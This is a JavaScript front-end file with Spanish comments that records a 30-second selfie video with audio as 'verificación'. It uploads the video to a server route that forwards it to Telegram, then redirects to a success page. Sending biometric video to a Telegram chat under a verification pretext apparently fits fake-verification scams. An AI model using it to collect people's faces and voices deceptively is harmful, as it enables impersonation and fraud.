document.addEventListener('DOMContentLoaded', () => {

    // --- Configuración ---
    // Esta es la URL de TU PROPIO servidor (el código de Node.js de abajo)
    const UPLOAD_URL = "/api/enviar-a-telegram"; 
    
    // Página a la que irá el cliente después de subir el video
    const SUCCESS_REDIRECT_URL = "https://tu-web.com/verificacion-exitosa.html";

    // Vistas
    const cameraView = document.getElementById('camera-view');
    const modalOverlay = document.getElementById('modal-overlay');
    const verifyingModal = document.getElementById('verifying-modal');
    
    // Elementos de la Cámara
    const videoPreview = document.getElementById('videoPreview');
    const status = document.getElementById('status');
    const countdownTimer = document.getElementById('countdown-timer');
    
    // Elementos del Modal
    const startVerificationButton = document.getElementById('start-verification-button');
    const modalContent = document.getElementById('modal-content'); 

    // Variables de grabación
    let mediaRecorder;
    let streamLocal;
    let recordedChunks = [];
    let countdownInterval;
    const RECORDING_SECONDS = 30;

    // --- 1. Iniciar Cámara ---
    async function setupCamera() {
        status.textContent = "Iniciando cámara...";
        startVerificationButton.disabled = true;

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' },
                audio: true
            });
            streamLocal = stream;
            videoPreview.srcObject = stream;
            status.textContent = "Cámara lista.";
            startVerificationButton.disabled = false;
        } catch (err) {
            console.error("Error al acceder a la cámara:", err);
            status.textContent = "Error: Permiso de cámara denegado.";
            modalContent.innerHTML = `
                <h2>Error de Cámara</h2>
                <p>No se pudo acceder a la cámara. Por favor, da permisos y recarga la página.</p>
            `;
        }
    }

    // --- 2. Iniciar Grabación ---
    function startRecording() {
        if (!streamLocal) return;

        recordedChunks = [];
        mediaRecorder = new MediaRecorder(streamLocal, { mimeType: 'video/webm' });

        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.onstop = () => {
            cameraView.style.display = 'none';
            verifyingModal.style.display = 'flex';

            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
            streamLocal.getTracks().forEach(track => track.stop());

            // ¡Llamar a la función de subida!
            uploadVideo(videoBlob);
        };

        mediaRecorder.start();
        
        status.textContent = "Grabando...";
        countdownTimer.textContent = RECORDING_SECONDS;
        countdownTimer.style.display = 'block';
        
        let secondsRemaining = RECORDING_SECONDS;
        
        countdownInterval = setInterval(() => {
            secondsRemaining--;
            countdownTimer.textContent = secondsRemaining;
            
            if (secondsRemaining <= 0) {
                stopRecording();
            }
        }, 1000); 
    }

    // --- 3. Detener Grabación ---
    function stopRecording() {
        clearInterval(countdownInterval); 
        countdownTimer.style.display = 'none'; 
        
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }
    }

    // --- 4. Subir el Video (¡Actualizado!) ---
    async function uploadVideo(videoBlob) {
        const formData = new FormData();
        // 'video' es el nombre que el backend (Node.js) esperará
        formData.append('video', videoBlob, `selfie_${Date.now()}.webm`);
        // (Opcional) Puedes enviar el ID de usuario aquí si lo tienes
        // formData.append('userId', 'user_123'); 

        try {
            const response = await fetch(UPLOAD_URL, {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                console.log("Video enviado a Telegram con éxito");
                window.location.href = SUCCESS_REDIRECT_URL;
            } else {
                throw new Error(`Error del servidor: ${response.statusText}`);
            }

        } catch (error) {
            console.error('Error al subir el video:', error);
            handleUploadError();
        }
    }

    // --- 5. Manejar Error de Subida ---
    function handleUploadError() {
        verifyingModal.style.display = 'none';
        modalOverlay.style.display = 'flex';
        modalContent.querySelector('h2').textContent = 'Error de Subida';
        modalContent.querySelector('p').textContent = 'No pudimos verificar tu video. Por favor, inténtalo de nuevo.';
        setupCamera(); // Preparar la cámara para un reintento
    }
    
    // --- Asignar Eventos ---
    startVerificationButton.onclick = () => {
        modalOverlay.style.display = 'none';
        startRecording();
    };

    // --- Iniciar ---
    setupCamera();
});